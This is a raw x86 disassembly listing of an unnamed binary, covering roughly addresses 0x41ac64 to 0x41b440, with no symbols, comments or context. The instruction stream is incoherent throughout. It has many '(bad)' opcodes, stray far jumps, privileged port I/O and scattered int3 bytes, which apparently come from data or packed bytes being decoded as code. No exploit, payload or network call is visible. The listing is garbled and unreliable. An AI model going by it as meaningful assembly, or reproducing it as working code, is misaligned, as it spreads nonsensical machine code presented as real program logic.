  41ac64:	cmp    BYTE PTR [edx-0x5ab301],0xcc
  41ac6b:	inc    DWORD PTR [eax]
  41ac6d:	(bad)  
  41ac6e:	jmp    FWORD PTR [edi+0x2900ff13]
  41ac74:	xor    BYTE PTR [eax+eax*1+0x83eb48],ch
  41ac7b:	add    ah,cl
  41ac7d:	clc    
  41ac7e:	sbb    DWORD PTR [edx],0x55
  41ac81:	(bad)  
  41ac82:	(bad)  
  41ac83:	js     0x41aceb
  41ac85:	jno    0x41ac87
  41ac87:	pop    edx
  41ac88:	push   es
  41ac89:	inc    DWORD PTR [ebx-0x180100]
  41ac8f:	cmp    dh,al
  41ac91:	add    bh,bh
  41ac93:	mov    edi,0xfc000370
  41ac98:	stos   BYTE PTR es:[edi],al
  41ac99:	add    ah,cl
  41ac9b:	add    bh,bh
  41ac9d:	retf   0xbc00
  41aca0:	mov    edi,edi
  41aca2:	add    BYTE PTR [ebx],cl
  41aca4:	sub    al,BYTE PTR cs:[ebx-0x7c1d41]
  41acab:	mov    edi,edi
  41acad:	ins    BYTE PTR es:[edi],dx
  41acae:	inc    DWORD PTR [eax-0x1a]
  41acb1:	add    DWORD PTR [eax],0x16
  41acb4:	sbb    BYTE PTR [esi-0x1],ah
  41acb7:	inc    edi
  41acb8:	pop    DWORD PTR [eax]
  41acba:	add    bh,bh
  41acbc:	add    BYTE PTR [eax],bh
  41acbe:	or     ecx,0xfffffffd
  41acc1:	add    BYTE PTR [ebx-0x7ce5fdc8],al
  41acc7:	push   cs
  41acc8:	xchg   edx,eax
  41acc9:	(bad)  
  41acca:	dec    esp
  41accc:	call   DWORD PTR [esi]
  41acce:	jmp    DWORD PTR [ebx+esi*8]
  41acd1:	(bad)  
  41acd2:	(bad)  
  41acd3:	cmp    al,0xcc
  41acd5:	dec    ebp
  41acd6:	call   DWORD PTR [edx]
  41acd8:	fadd   DWORD PTR [eax]
  41acda:	add    bh,bh
  41acdc:	add    BYTE PTR [ebp+0x0],dh
  41acdf:	dec    esi
  41ace0:	jecxz  0x41ace2
  41ace2:	or     DWORD PTR ds:0x2cff7423,0xffffff88
  41ace9:	inc    DWORD PTR [ebx+0xc0ff00]
  41acef:	sbb    DWORD PTR [edi+0x1d4e0083],esp
  41acf5:	xchg   ebx,eax
  41acf6:	add    BYTE PTR [edx-0x64],bh
  41acfc:	add    dh,ch
  41acfe:	int3   
  41acff:	lods   al,BYTE PTR ds:[esi]
  41ad00:	nop
  41ad01:	dec    esp
  41ad03:	hlt    
  41ad04:	add    DWORD PTR [ebx],ebp
  41ad06:	(bad)  
  41ad07:	jl     0x41ad66
  41ad09:	int3   
  41ad0a:	add    bh,bh
  41ad0c:	add    BYTE PTR [eax],bh
  41ad0e:	or     DWORD PTR [eax+0x1200ff02],0x6
  41ad15:	jne    0x41ad16
  41ad17:	or     al,0xef
  41ad19:	add    BYTE PTR [eax],al
  41ad1b:	inc    DWORD PTR [ebx+0x53980096]
  41ad21:	inc    DWORD PTR [eax]
  41ad23:	push   esi
  41ad24:	std    
  41ad25:	push   ebp
  41ad26:	dec    DWORD PTR [ecx-0x55]
  41ad29:	inc    DWORD PTR [ebx-0x2e7601]
  41ad2f:	pop    ecx
  41ad30:	xchg   ebp,eax
  41ad31:	(bad)  
  41ad32:	jmp    FWORD PTR [edi+0x4aff379b]
  41ad38:	xor    al,0xff
  41ad3a:	int3   
  41ad3b:	int3   
  41ad3c:	jmp    DWORD PTR [edi]
  41ad3e:	add    esi,0x3c
  41ad41:	inc    DWORD PTR [eax]
  41ad43:	(bad)  
  41ad44:	repz idiv edi
  41ad47:	hlt    
  41ad48:	clc    
  41ad49:	dec    DWORD PTR [ecx+0x2200ff]
  41ad4f:	mov    dh,0xcd
  41ad51:	add    BYTE PTR [eax],al
  41ad53:	test   BYTE PTR [bp+di-0x7d],al
  41ad57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad58:	pop    ebp
  41ad59:	mov    DWORD PTR [ebx-0x76917700],eax
  41ad5f:	outs   dx,BYTE PTR ds:[esi]
  41ad60:	xor    BYTE PTR [eax],al
  41ad62:	adc    ebp,0xffffff89
  41ad65:	in     eax,0x0
  41ad67:	mov    bh,0x53
  41ad69:	add    BYTE PTR [ebx+0xfb0000],al
  41ad6f:	mov    dh,0xa5
  41ad71:	dec    esp
  41ad73:	mov    esi,0x26009a24
  41ad78:	add    eax,0xffff00
  41ad7d:	test   BYTE PTR [eax],0xc9
  41ad80:	cdq    
  41ad81:	cmp    edi,0xfffffff5
  41ad84:	pop    eax
  41ad85:	out    0x83,eax
  41ad87:	sbb    DWORD PTR [edx],ecx
  41ad89:	mov    DWORD PTR [eax],eax
  41ad8b:	(bad)  
  41ad8c:	jmp    FWORD PTR [edi]
  41ad8e:	(bad)  
  41ad8f:	mov    ecx,0xa8ffff35
  41ad94:	sub    eax,0x89418970
  41ad99:	add    bh,bh
  41ad9b:	dec    DWORD PTR [ecx-0xbbcff0e]
  41ada1:	(bad)  
  41ada2:	dec    DWORD PTR [edx-0x1b7c50af]
  41ada8:	ss cmp edi,0xffffffcc
  41adac:	(bad)  
  41adad:	mov    eax,0xff62efff
  41adb2:	(bad)  
  41adb3:	cmp    al,BYTE PTR [eax-0x54]
  41adb6:	push   DWORD PTR [ecx+0x836d]
  41adbc:	dec    ebp
  41adbe:	add    BYTE PTR [esi-0x1e7c7689],ah
  41adc4:	pop    esp
  41adc5:	pusha  
  41adc6:	sbb    DWORD PTR [edx],0xfffffff2
  41adc9:	inc    DWORD PTR [eax]
  41adcb:	(bad)  
  41adcc:	jmp    esp
  41adce:	dec    DWORD PTR [ecx+0x3fffff7d]
  41add4:	mov    ebx,0x30b90013
  41add9:	inc    DWORD PTR [eax]
  41addb:	add    BYTE PTR [ebx-0x108f00a2],al
  41ade1:	add    BYTE PTR [ebx+0xcb4d64],al
  41ade7:	dec    edx
  41ade8:	mov    bh,bh
  41adea:	add    DWORD PTR [ebx+0x10098ff],0x36
  41adf1:	add    bh,bh
  41adf3:	lods   al,BYTE PTR ds:[esi]
  41adf4:	enter  0xff27,0xfe
  41adf8:	ret    
  41adf9:	add    DWORD PTR [eax],0xffffffff
  41adfc:	int3   
  41adfd:	stc    
  41adfe:	add    bl,dl
  41ae00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae01:	int3   
  41ae02:	inc    DWORD PTR [eax]
  41ae04:	call   FWORD PTR [ebx+0x9dd583]
  41ae0a:	cmp    edi,0xffffffff
  41ae0d:	sub    DWORD PTR ss:[edx+0x7],0x0
  41ae12:	add    BYTE PTR [eax],bh
  41ae14:	les    esp,FWORD PTR [ebx]
  41ae16:	push   DWORD PTR [esi-0x74]
  41ae1c:	add    bh,ah
  41ae1e:	jmp    DWORD PTR [eax-0x24]
  41ae21:	(bad)  
  41ae22:	call   DWORD PTR [edx-0x48001220]
  41ae28:	xlat   BYTE PTR ds:[ebx]
  41ae29:	cmp    edi,0x0
  41ae2c:	jmp    FWORD PTR [edx]
  41ae2e:	call   DWORD PTR [ebx]
  41ae30:	add    eax,DWORD PTR [ebx-0x4e331e01]
  41ae36:	int3   
  41ae37:	xchg   ebx,eax
  41ae38:	clc    
  41ae39:	(bad)  
  41ae3a:	inc    DWORD PTR [eax]
  41ae3c:	call   DWORD PTR [edx-0xc42900]
  41ae42:	push   esi
  41ae44:	xchg   esp,eax
  41ae45:	ins    DWORD PTR es:[edi],dx
  41ae46:	add    BYTE PTR [eax+0x83838a],dh
  41ae4c:	call   ebp
  41ae4e:	add    BYTE PTR [esi+eax*4+0x0],dh
  41ae52:	dec    DWORD PTR [edx]
  41ae54:	jge    0x41ae1c
  41ae56:	int3   
  41ae57:	ins    BYTE PTR es:[edi],dx
  41ae58:	mov    esp,cs
  41ae5a:	inc    DWORD PTR [ebx-0x3b002f34]
  41ae60:	rol    BYTE PTR [ebx+0x3a1e0a00],0xff
  41ae67:	xchg   esi,eax
  41ae68:	sti    
  41ae69:	dec    DWORD PTR [ecx-0xee7601]
  41ae6f:	dec    eax
  41ae70:	adc    al,BYTE PTR [eax]
  41ae72:	dec    DWORD PTR [ecx+ebp*2-0x4a]
  41ae76:	call   ecx
  41ae78:	cmp    eax,0xff89ff00
  41ae7d:	ins    DWORD PTR es:[edi],dx
  41ae7e:	call   ecx
  41ae80:	xchg   ecx,eax
  41ae81:	add    bh,bh
  41ae83:	sbb    ecx,DWORD PTR [eax]
  41ae85:	mov    dl,0xff
  41ae87:	rol    DWORD PTR [ebp+0xff83ff],1
  41ae8d:	cmp    edi,0xffffffe6
  41ae90:	dec    edi
  41ae91:	dec    esp
  41ae93:	mov    edx,0x2aff421b
  41ae98:	cld    
  41ae99:	inc    DWORD PTR [eax]
  41ae9b:	add    bh,bh
  41ae9d:	imul   eax,DWORD PTR [eax],0xff541c
  41aea3:	or     cl,BYTE PTR [ebp-0x77]
  41aea6:	add    BYTE PTR [ebx],cl
  41aea8:	cmp    BYTE PTR [ecx+0x7083cc00],cl
  41aeae:	jmp    DWORD PTR [ebp-0x333300e7]
  41aeb4:	inc    ebp
  41aeb5:	mov    ?,edi
  41aeb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb8:	lea    eax,[eax]
  41aeba:	inc    DWORD PTR [ebx+0x4aff8689]
  41aec0:	je     0x41aec1
  41aec2:	add    BYTE PTR [eax],dl
  41aec4:	gs dec edx
  41aec6:	add    BYTE PTR [edi-0x7c0078],bh
  41aecc:	add    BYTE PTR [eax+eax*1],dl
  41aecf:	stc    
  41aed0:	aas    
  41aed1:	cmp    edi,0x4a
  41aed4:	mov    bl,0x55
  41aed6:	dec    DWORD PTR [edi-0x7ce6]
  41aedc:	(bad)  
  41aedd:	call   0x89875ee2
  41aee2:	call   DWORD PTR [edi+0x12]
  41aee5:	jl     0x41aee6
  41aee7:	inc    ebp
  41aee8:	mov    DWORD PTR gs:[eax],eax
  41aeeb:	dec    DWORD PTR [ecx-0x31c6ffef]
  41aef1:	add    BYTE PTR [ebx-0xd4a28d],al
  41aef7:	mov    dh,0xdc
  41aef9:	cmp    edi,0xffffff83
  41aefc:	call   DWORD PTR [edi]
  41aefe:	call   FWORD PTR [ecx+0x30]
  41af01:	(bad)  
  41af02:	inc    edi
  41af04:	and    edi,DWORD PTR [edi+0xac1eff]
  41af0a:	(bad)  
  41af0b:	(bad)  
  41af0c:	jmp    DWORD PTR [eax+eax*1+0xcbd2]
  41af13:	in     eax,0x64
  41af15:	outs   dx,DWORD PTR ds:[esi]
  41af16:	jmp    FWORD PTR [eax]
  41af18:	adc    cl,BYTE PTR [ecx+0x74ffcc00]
  41af1e:	jmp    FWORD PTR [edx+0x1affcc6e]
  41af24:	and    BYTE PTR [ecx],cl
  41af26:	mov    ebp,ebx
  41af28:	adc    al,0x0
  41af2a:	mov    edi,edi
  41af2c:	jmp    DWORD PTR [ecx-0x76184401]
  41af32:	mov    eax,ebx
  41af34:	inc    eax
  41af35:	inc    eax
  41af36:	jmp    esi
  41af38:	fiadd  DWORD PTR [eax]
  41af3a:	cmp    edi,0xffffffff
  41af3d:	mov    bl,0x0
  41af3f:	int    0xf1
  41af41:	add    bh,bh
  41af43:	neg    BYTE PTR [ebx]
  41af45:	loop   0x41af47
  41af47:	sbb    esi,DWORD PTR ds:0xffccffff
  41af4d:	mov    dl,0x0
  41af4f:	popa   
  41af50:	(bad)  
  41af52:	push   ebp
  41af54:	add    al,0x7c
  41af56:	add    BYTE PTR [ebp-0xff0099],ch
  41af5c:	add    BYTE PTR [edi],bl
  41af5e:	call   DWORD PTR [ebx]
  41af60:	push   ebp
  41af61:	inc    DWORD PTR [ebx-0x307d8b]
  41af67:	push   ebp
  41af68:	xor    BYTE PTR [ebx+0x76838300],al
  41af6e:	or     DWORD PTR [esi-0x6b000075],0x9
  41af75:	inc    edx
  41af76:	jmp    DWORD PTR [ebp-0x3300ffae]
  41af7c:	mov    DWORD PTR [ebx+eax*4-0xff779a],eax
  41af83:	lahf   
  41af84:	xchg   ebx,eax
  41af85:	fild   DWORD PTR [eax]
  41af87:	mov    esi,0xff00fff7
  41af8c:	add    BYTE PTR [ecx-0x7d],al
  41af8f:	adc    DWORD PTR [ebx+0x0],eax
  41af92:	adc    DWORD PTR [edi+ecx*8-0x58],0x0
  41af97:	xor    bh,bl
  41af99:	add    BYTE PTR [eax],al
  41af9b:	(bad)  
  41af9c:	jmp    DWORD PTR [edi+edi*8-0xffe3b0]
  41afa3:	das    
  41afa4:	or     cl,BYTE PTR [ecx+0x0]
  41afa7:	ret    
  41afa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afa9:	cmp    edi,0xffffff89
  41afac:	(bad)  
  41afad:	cmp    bh,bh
  41afaf:	jmp    0xc094:0x4effffd8
  41afb6:	and    DWORD PTR [ecx+ebp*4],0xffffffff
  41afba:	inc    DWORD PTR [eax]
  41afbc:	inc    DWORD PTR [eax+eax*1+0x64]
  41afc0:	jnp    0x41afc1
  41afc2:	push   DWORD PTR [eax+0x27ff7d58]
  41afc8:	ds (bad) 
  41afca:	inc    DWORD PTR [ebx-0x700d201]
  41afd0:	or     al,0xff
  41afd2:	add    BYTE PTR ds:0x3e002ceb,dh
  41afd8:	fwait
  41afd9:	int3   
  41afda:	inc    DWORD PTR [eax]
  41afdc:	jmp    DWORD PTR [ebp-0x762b4c00]
  41afe2:	call   DWORD PTR [ecx-0x32]
  41afe5:	je     0x41afe7
  41afe7:	dec    edi
  41afe8:	mov    edi,edi
  41afea:	inc    DWORD PTR [eax]
  41afec:	add    bl,ah
  41afee:	add    bh,dl
  41aff0:	push   ds
  41aff1:	add    DWORD PTR [eax],0x3f
  41aff4:	pop    ebp
  41aff5:	sub    eax,0xffb4ce00
  41affa:	add    BYTE PTR [ecx+0x6ff5783],cl
  41b000:	jb     0x41b001
  41b002:	int3   
  41b003:	aad    0x5a
  41b005:	pop    edx
  41b006:	jmp    FWORD PTR [ecx-0x5]
  41b009:	cmp    edi,0xffffffcc
  41b00c:	add    BYTE PTR [edi-0x7d],cl
  41b00f:	sbb    edi,eax
  41b011:	add    BYTE PTR [eax],al
  41b013:	in     al,dx
  41b014:	lock jnp 0x41b016
  41b017:	cmp    DWORD PTR [esi-0x1],ecx
  41b01a:	int3   
  41b01b:	(bad)  
  41b01c:	push   DWORD PTR [eax-0x7c59cc34]
  41b022:	add    BYTE PTR [edx+0x45],al
  41b025:	test   DWORD PTR [eax],eax
  41b027:	cmp    al,0x48
  41b029:	mov    DWORD PTR [eax],eax
  41b02b:	mov    DWORD PTR [ecx-0x5f31ff46],ecx
  41b031:	inc    DWORD PTR [eax]
  41b033:	xor    ch,bh
  41b035:	or     DWORD PTR [ecx-0xa9de],0xffcfff83
  41b03f:	inc    edi
  41b040:	xor    bh,bh
  41b042:	mov    edi,ebp
  41b044:	mov    edi,0x7fddffb2
  41b049:	add    bh,bh
  41b04b:	add    BYTE PTR [eax],al
  41b04d:	dec    ecx
  41b04e:	int3   
  41b04f:	push   esp
  41b050:	mov    BYTE PTR [eax],0xff
  41b053:	cmp    DWORD PTR [ebx-0x11a400e4],esp
  41b059:	(bad)  
  41b05a:	dec    esp
  41b05c:	mov    ebp,edx
  41b05e:	int3   
  41b05f:	mov    dh,0x2c
  41b061:	or     DWORD PTR [ecx+0xc4de26],0x15
  41b068:	mov    eax,0xffff8900
  41b06d:	(bad)  
  41b06e:	call   DWORD PTR [edi+0x45]
  41b071:	(bad)  
  41b072:	call   DWORD PTR [ebp+0x40]
  41b075:	int3   
  41b076:	adc    edi,0xffffffdc
  41b079:	dec    DWORD PTR [ecx-0x335b0000]
  41b07f:	(bad)  
  41b080:	lock add bh,bh
  41b083:	in     eax,0xf4
  41b085:	call   0xff00:0x6545ff
  41b08c:	or     DWORD PTR [esi],0xffffffff
  41b08f:	inc    edi
  41b090:	repz inc DWORD PTR [eax]
  41b093:	sub    eax,0xc9ffe11d
  41b098:	jb     0x41b066
  41b09a:	inc    DWORD PTR [eax]
  41b09c:	xor    DWORD PTR [edi+0x4a5783],0xffffffff
  41b0a3:	mov    esi,DWORD PTR [ebp+0x61f8ccc3]
  41b0a9:	add    DWORD PTR [eax],0x0
  41b0ac:	add    BYTE PTR [esi-0x1],ah
  41b0af:	sub    al,0x5e
  41b0b1:	int3   
  41b0b2:	add    BYTE PTR [ecx+eiz*1-0x64eaffb7],al
  41b0b9:	inc    DWORD PTR [ebx+0x81ff89]
  41b0bf:	pop    edx
  41b0c0:	pop    edi
  41b0c1:	add    DWORD PTR [ebx+0xd07df1],0xd
  41b0c8:	or     bh,bh
  41b0ca:	inc    DWORD PTR [eax]
  41b0cc:	add    BYTE PTR [ecx],dl
  41b0ce:	int3   
  41b0cf:	xor    eax,DWORD PTR es:[eax]
  41b0d2:	jmp    DWORD PTR ds:0x74898cf4
  41b0d8:	push   cs
  41b0d9:	inc    DWORD PTR [eax]
  41b0db:	(bad)  
  41b0dc:	dec    DWORD PTR [eax-0x1]
  41b0df:	sbb    eax,0xf4ffff8f
  41b0e4:	outs   dx,DWORD PTR ds:[esi]
  41b0e5:	sbb    DWORD PTR [eax],eax
  41b0e7:	push   0x35
  41b0e9:	cmp    edi,0xffffffff
  41b0ec:	jmp    DWORD PTR [eax+eax*1]
  41b0ef:	fnsave [ebx+0x0]
  41b0f2:	int3   
  41b0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0f4:	mov    esi,fs
  41b0f6:	add    BYTE PTR [edi-0x44],bl
  41b0f9:	(bad)  
  41b0fa:	dec    esp
  41b0fc:	inc    DWORD PTR [eax+eax*1]
  41b0ff:	adc    esi,ebp
  41b101:	(bad)  
  41b102:	inc    DWORD PTR [ebx]
  41b104:	xor    ch,dl
  41b106:	int3   
  41b107:	push   0x9
  41b109:	cmp    edi,0xffffff83
  41b10c:	add    al,ah
  41b10e:	jmp    edx
  41b110:	xchg   ecx,eax
  41b111:	add    bh,bh
  41b113:	or     al,0xd7
  41b115:	ja     0x41b116
  41b117:	pop    esi
  41b118:	pushf  
  41b119:	inc    DWORD PTR [eax]
  41b11b:	(bad)  
  41b11c:	call   DWORD PTR [ecx-0x68700]
  41b122:	add    BYTE PTR [edi+eax*1-0x80],ah
  41b126:	jmp    DWORD PTR [ebx-0xff12]
  41b12c:	int3   
  41b12d:	mov    DWORD PTR [eax],0xff9334
  41b133:	fnstsw WORD PTR [esi-0x71]
  41b136:	int3   
  41b137:	xchg   eax,ebx
  41b139:	add    ah,cl
  41b13b:	int3   
  41b13c:	add    BYTE PTR [edi],bl
  41b13e:	(bad)  
  41b13f:	cmp    eax,0xa800891f
  41b144:	sbb    eax,0x1e7d0019
  41b149:	add    BYTE PTR [eax],al
  41b14b:	inc    DWORD PTR [ebx+0x7988ff09]
  41b151:	add    BYTE PTR [eax],al
  41b153:	sti    
  41b154:	hlt    
  41b155:	rol    DWORD PTR [eax],0x8a
  41b158:	inc    esp
  41b159:	add    BYTE PTR [ebx+0x23ffff],al
  41b15f:	add    bh,BYTE PTR [edx-0x34]
  41b162:	add    BYTE PTR ds:0x8affdb58,dl
  41b168:	push   ecx
  41b169:	inc    DWORD PTR [eax]
  41b16b:	add    DWORD PTR [eax],0xffffffcc
  41b16e:	add    BYTE PTR [eax-0x40ff7c67],dl
  41b174:	xchg   ecx,eax
  41b175:	repz inc DWORD PTR [ebp+ebp*8+0x0]
  41b17a:	add    BYTE PTR [eax],al
  41b17c:	(bad)  
  41b17d:	fcos   
  41b17f:	sbb    esp,DWORD PTR [ebp-0x7d]
  41b182:	adc    esp,0xffffffa6
  41b185:	sub    bh,bh
  41b187:	imul   ebp,DWORD PTR [ecx+0x0],0xc883ffff
  41b18e:	add    BYTE PTR [edx],dh
  41b190:	adc    al,BYTE PTR [ebx+0x3277a9ff]
  41b196:	call   ebp
  41b198:	pop    edx
  41b199:	add    BYTE PTR [eax],al
  41b19b:	add    bh,bh
  41b19d:	inc    ebp
  41b19e:	jmp    FWORD PTR [esi+0x70ffff21]
  41b1a4:	and    ebp,DWORD PTR [ebx]
  41b1a6:	add    al,ch
  41b1a8:	sub    al,0x0
  41b1aa:	add    BYTE PTR [eax],al
  41b1ac:	inc    DWORD PTR [edx-0xa6b234]
  41b1b2:	add    BYTE PTR [edi+0x5d],dh
  41b1b5:	stos   DWORD PTR es:[edi],eax
  41b1b6:	adc    DWORD PTR [ecx+esi*4+0xffff89],0x5b
  41b1be:	int3   
  41b1bf:	icebp  
  41b1c0:	outs   dx,BYTE PTR ds:[esi]
  41b1c1:	(bad)  
  41b1c2:	inc    DWORD PTR [eax+0x36831cf2]
  41b1c8:	out    0xff,eax
  41b1ca:	mov    DWORD PTR [eax],eax
  41b1cc:	dec    DWORD PTR [esi-0x293877]
  41b1d2:	int3   
  41b1d3:	xor    bh,BYTE PTR [esi+0x53e7ff54]
  41b1d9:	(bad)  
  41b1da:	inc    DWORD PTR [ebx+0x7c007500]
  41b1e0:	xchg   esp,eax
  41b1e1:	mov    edi,edi
  41b1e3:	stc    
  41b1e4:	pushf  
  41b1e5:	jmp    0xff00:0xccbe1800
  41b1ec:	or     DWORD PTR ds:0xa83500,0xffffffcc
  41b1f3:	mov    bh,0xca
  41b1f5:	push   es
  41b1f6:	jmp    FWORD PTR ds:0xcc000038
  41b1fc:	call   FWORD PTR [esi-0x1]
  41b1ff:	mov    edi,0xc5ff00ca
  41b204:	aad    0x24
  41b206:	mov    ebp,esi
  41b208:	sub    BYTE PTR [eax],al
  41b20a:	(bad)  
  41b20b:	dec    esp
  41b20d:	fiadd  DWORD PTR [ebx+0x833eef]
  41b213:	out    dx,al
  41b214:	push   edx
  41b215:	mov    cl,0xff
  41b217:	hlt    
  41b218:	and    eax,0x8300ff89
  41b21d:	push   ds
  41b21e:	call   DWORD PTR [eax+ebx*8+0x0]
  41b222:	mov    DWORD PTR [ebx-0xd332004],edx
  41b228:	inc    ebp
  41b229:	(bad)  
  41b22a:	dec    DWORD PTR [ecx-0x7a00447d]
  41b230:	mov    edi,0xf8460000
  41b235:	xchg   DWORD PTR [eax],eax
  41b237:	retf   0xcc61
  41b23a:	inc    DWORD PTR [eax]
  41b23c:	add    al,ch
  41b23e:	jmp    DWORD PTR [ebp+0x3e]
  41b241:	inc    DWORD PTR [ebx-0xb4de81]
  41b247:	retf   0xff4e
  41b24a:	int3   
  41b24b:	or     esp,0xffffffc0
  41b24e:	add    BYTE PTR [ecx+0x2e],ah
  41b251:	add    DWORD PTR [eax],0xffffffa5
  41b254:	into   
  41b255:	jae    0x41b223
  41b257:	dec    edi
  41b258:	(bad)  
  41b259:	inc    DWORD PTR [eax]
  41b25b:	inc    DWORD PTR [eax]
  41b25d:	cdq    
  41b25e:	add    BYTE PTR [eax+edi*4+0x2d35ffff],ch
  41b265:	fimul  DWORD PTR [ecx-0x25a1]
  41b26b:	(bad)  
  41b26c:	dec    DWORD PTR ds:0x64dacc
  41b272:	mov    DWORD PTR [esi+0x6b],ecx
  41b275:	sbb    eax,DWORD PTR [eax]
  41b277:	out    0x76,al
  41b279:	int3   
  41b27a:	inc    DWORD PTR [eax]
  41b27c:	add    BYTE PTR [edi+edi*8-0x7ce992],ch
  41b283:	sub    al,0x8c
  41b285:	test   eax,0x597ff
  41b28a:	add    DWORD PTR [eax],0xffffff83
  41b28d:	in     eax,0xff
  41b28f:	out    0xa2,eax
  41b291:	inc    DWORD PTR [ebx-0x7c2a3256]
  41b297:	ror    bh,cl
  41b299:	(bad)  
  41b29a:	inc    DWORD PTR [eax]
  41b29c:	dec    ecx
  41b29e:	dec    DWORD PTR [edi]
  41b2a0:	add    al,0x89
  41b2a2:	jmp    DWORD PTR [ebp+0x76]
  41b2a5:	or     al,BYTE PTR [eax]
  41b2a7:	shl    DWORD PTR [ebx+eax*4+0x0],0x83
  41b2ac:	add    BYTE PTR [esi-0xffe901],bh
  41b2b2:	mov    esp,ecx
  41b2b4:	pop    DWORD PTR [eax]
  41b2b6:	xor    eax,0xd009e8f
  41b2bb:	mov    ?,edi
  41b2bd:	int3   
  41b2be:	pop    edi
  41b2bf:	mov    edi,edi
  41b2c1:	add    BYTE PTR [edx],ch
  41b2c3:	add    BYTE PTR [edx+0x0],ah
  41b2c6:	das    
  41b2c7:	mov    BYTE PTR [eax],cl
  41b2c9:	call   DWORD PTR [edi-0x7affffda]
  41b2cf:	dec    DWORD PTR [ecx+0x1f001dff]
  41b2d5:	call   FWORD PTR [ebx-0x2d]
  41b2d8:	push   ecx
  41b2d9:	(bad)  
  41b2da:	jp     0x41b34c
  41b2dc:	add    bh,bh
  41b2de:	test   eax,0xa989ccff
  41b2e3:	add    BYTE PTR [ebp-0x1],dh
  41b2e6:	fild   WORD PTR [ecx-0x73560081]
  41b2ec:	add    BYTE PTR [ebx-0x5e],al
  41b2f2:	xor    DWORD PTR [eax],eax
  41b2f4:	sbb    bh,bh
  41b2f6:	addr16 out dx,al
  41b2f8:	scas   al,BYTE PTR es:[edi]
  41b2f9:	add    BYTE PTR [ecx-0x30ff7cf5],bh
  41b2ff:	dec    esp
  41b301:	sbb    DWORD PTR ds:0xd6008eff,0xffffff96
  41b308:	sub    bh,bh
  41b30a:	pop    esp
  41b30b:	xchg   ah,cl
  41b30d:	jmp    FWORD PTR [eax+0x5300ffff]
  41b313:	jmp    FWORD PTR [esi+0x65a9e300]
  41b319:	add    BYTE PTR [ecx],ah
  41b31b:	xor    al,0x83
  41b31d:	add    al,dl
  41b31f:	(bad)  
  41b320:	(bad)  
  41b321:	dec    edx
  41b323:	mov    DWORD PTR [ebx+0x507f1bff],ecx
  41b329:	xor    esi,0x74
  41b32c:	add    BYTE PTR [eax],al
  41b32e:	rol    BYTE PTR [eax],0x0
  41b331:	add    BYTE PTR [edx+0x3c005100],ch
  41b337:	jecxz  0x41b326
  41b339:	inc    ebp
  41b33b:	jo     0x41b309
  41b33d:	add    bh,cl
  41b33f:	inc    DWORD PTR [ebx-0x2affee01]
  41b345:	sbb    DWORD PTR [edx-0x5e7cfd7e],0xffffffd3
  41b34c:	mov    edi,edi
  41b34e:	mov    ds:0x6f00ff83,eax
  41b353:	add    BYTE PTR [edx+0x2acbabff],dl
  41b359:	(bad)  
  41b35a:	mov    ebp,0x6cccccbd
  41b35f:	add    bh,bh
  41b361:	(bad)  
  41b362:	call   0x1a0e4a67
  41b367:	mov    bl,0xe6
  41b369:	add    BYTE PTR [esi],dl
  41b36b:	inc    edx
  41b36c:	inc    DWORD PTR [eax]
  41b36e:	cld    
  41b36f:	mov    DWORD PTR [eax],eax
  41b371:	add    BYTE PTR [ecx],ch
  41b373:	dec    DWORD PTR [ebx+0x35db77ff]
  41b379:	jmp    FWORD PTR [eax-0x38ff7c85]
  41b37f:	int3   
  41b380:	(bad)  
  41b381:	dec    DWORD PTR [eax+0x0]
  41b384:	push   esi
  41b385:	mov    ebx,edi
  41b387:	xor    DWORD PTR ds:0x124c83,edi
  41b38d:	call   FWORD PTR [eax+eax*1-0x33b20001]
  41b394:	inc    esp
  41b395:	(bad)  
  41b396:	(bad)  
  41b397:	mov    bh,0xb0
  41b399:	add    DWORD PTR [ebx],0x1b
  41b39c:	dec    DWORD PTR [ecx-0x96]
  41b3a2:	jb     0x41b3a4
  41b3a4:	mov    bh,bh
  41b3a6:	and    DWORD PTR [esp+ebp*4-0x34],esi
  41b3aa:	cli    
  41b3ab:	retf   0xffff
  41b3ae:	add    al,0x0
  41b3b0:	or     DWORD PTR [ecx-0x1eff25],0xffffff86
  41b3b7:	sbb    eax,0x99540050
  41b3bc:	mov    DWORD PTR [eax],eax
  41b3be:	or     al,BYTE PTR [eax]
  41b3c0:	add    bh,bh
  41b3c2:	push   ebx
  41b3c3:	int3   
  41b3c4:	fmulp  st(4),st
  41b3c6:	dec    esi
  41b3c7:	xor    esi,edx
  41b3c9:	add    BYTE PTR [ebp-0x6a],ah
  41b3cc:	inc    DWORD PTR [eax]
  41b3ce:	mov    DWORD PTR [ebx+0xa50000],eax
  41b3d4:	sbb    ah,cl
  41b3d6:	lods   eax,DWORD PTR ds:[esi]
  41b3d7:	aad    0x94
  41b3d9:	push   DWORD PTR [esi]
  41b3db:	adc    edi,edi
  41b3dd:	jmp    ebx
  41b3df:	(bad)  
  41b3e0:	(bad)  
  41b3e1:	push   DWORD PTR [ecx+ecx*4+0x563fff01]
  41b3e8:	arpl   WORD PTR [eax],ax
  41b3ea:	inc    edx
  41b3eb:	mov    ch,0x83
  41b3ed:	add    BYTE PTR [ebx+0x0],al
  41b3f0:	add    BYTE PTR [ebx-0x6d7c9b],al
  41b3f6:	int3   
  41b3f7:	mov    ebx,0xf9a7832e
  41b3fc:	(bad)  
  41b3fd:	dec    DWORD PTR [edx+0x6a00ffff]
  41b403:	xor    ebp,0x0
  41b406:	je     0x41b480
  41b408:	or     al,0x0
  41b40a:	(bad)  
  41b40b:	outs   dx,DWORD PTR ds:[esi]
  41b40c:	(bad)  
  41b40d:	jmp    FWORD PTR [ebx-0x7d]
  41b410:	(bad)  
  41b411:	inc    DWORD PTR [ecx]
  41b413:	jmp    FWORD PTR [ebx-0x7d]
  41b416:	mov    ah,0x6
  41b418:	mov    al,ds:0xff105a00
  41b41d:	push   DWORD PTR [esi+0x0]
  41b420:	inc    DWORD PTR [ebx-0x16007a]
  41b426:	push   cs
  41b427:	push   0xffffff98
  41b429:	jmp    DWORD PTR [esi]
  41b42b:	mov    ebp,0x83de0000
  41b430:	(bad)  
  41b431:	jmp    DWORD PTR [edx]
  41b433:	int3   
  41b434:	pop    ds
  41b435:	mov    DWORD PTR [edx-0x2500c9dd],edi
  41b43b:	lods   eax,DWORD PTR ds:[esi]
  41b43c:	add    bh,bh
  41b43e:	test   DWORD PTR [eax],eax
  41b440:	(bad)  
